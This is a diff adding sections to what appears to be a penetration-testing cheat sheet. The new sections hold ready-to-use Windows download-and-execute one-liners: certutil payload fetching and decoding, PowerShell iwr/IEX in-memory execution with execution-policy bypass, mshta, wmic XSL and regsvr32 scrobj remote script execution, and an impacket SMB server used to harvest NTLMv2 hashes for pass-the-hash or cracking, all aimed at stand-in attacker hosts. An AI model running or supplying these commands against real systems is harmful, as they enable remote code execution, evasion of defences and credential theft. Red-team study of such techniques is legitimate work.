@@ -131,6 +131,93 @@ scp -r l_dir_path u@ip:r_dir_path
 -q      # hidden the output
 ```
 
+### certutil - windows powershell
+
+```powershell
+# Multiple ways to download and execute files:
+certutil -urlcache -split -f http://webserver/payload payload
+
+# Execute a specific .dll:
+certutil -urlcache -split -f http://webserver/payload.b64 payload.b64 & certutil -decode payload.b64 payload.dll & C:\Windows\Microsoft.NET\Framework64\v4.0.30319\InstallUtil /logfile= /LogToConsole=false /u payload.dll
+
+# Execute an .exe:
+certutil -urlcache -split -f http://webserver/payload.b64 payload.b64 & certutil -decode payload.b64 payload.exe & payload.exe
+```
+
+### cscript - windows powershell
+```powershell
+# Execute file from a WebDav server:
+cscript //E:jscript \\IP\folder\payload.txt
+
+# Download using wget.vbs
+cscript wget.vbs http://IP/file.exe file.exe
+
+# One liner download file from WebServer:
+powershell -exec bypass -c "(New-Object Net.WebClient).Proxy.Credentials=[Net.CredentialCache]::DefaultNetworkCredentials;iwr('http://webserver/payload.ps1')|iex"
+powershell -exec bypass -c "(new-object System.Net.WebClient).DownloadFile('http://IP/file.exe','C:\Users\user\Desktop\file.exe')"
+
+# Download from WebDAV Server:
+powershell -exec bypass -f \\IP\folder\payload.ps1
+```
+
+### Windows mshta wmic regsvr32
+```powershell
+# Method 1
+mshta vbscript:Close(Execute("GetObject(""script:http://IP/payload.sct"")"))
+
+# Method 2
+mshta http://IP/payload.hta
+
+# Method 3 (Using WebDav)
+mshta \\IP\payload.hta
+
+#Download and execute XSL using wmic
+wmic os get /format:"https://webserver/payload.xsl"
+
+
+# Download and execute over a WebServer:
+regsvr32 /u /n /s /i:http://webserver/payload.sct scrobj.dll
+
+# Using WebDAV
+regsvr32 /u /n /s /i:\\webdavserver\folder\payload.sct scrobj.dll
+
+# Powershell Cmdlet
+Invoke-WebRequest "https://server/filename" -OutFile "C:\Windows\Temp\filename"
+
+# Powershell One-Line
+(New-Object System.Net.WebClient).DownloadFile("https://server/filename", "C:\Windows\Temp\filename") 
+
+# In Memory Execution
+IEX(New-Object Net.WebClient).downloadString('http://server/script.ps1')
+```
+
+### SMB
+```bash
+# Set up a SMB server using smbserver.py from impacket
+smbserver.py SHARE_NAME path/to/share
+
+# From target Windows:
+net view \\KALI_IP
+(Should display the SHARE_NAME)
+
+dir \\KALI_IP\SHARE_NAME
+copy \\KALI_IP\SHARE_NAME\file.exe .
+
+# Looking at smbserver logs you also grab the NTLMv2 hashes of your current Windows user
+# can be usefull to PTH, or crack passwords
+
+# Since Windows 10, you can't do anonymous smb server anymore
+sudo python smbserver.py SDFR /BloodHound/Ingestors -smb2support -username "peon" -password "peon"
+net use Z: \\192.168.30.130\SDFR /user:peon peon
+net use Z: /delete /y
+```
+
+```bash
+impacket smbserver
+net use z: \\attackerip\sharename
+```
+
+
 ### ftpd
 
 ```shell
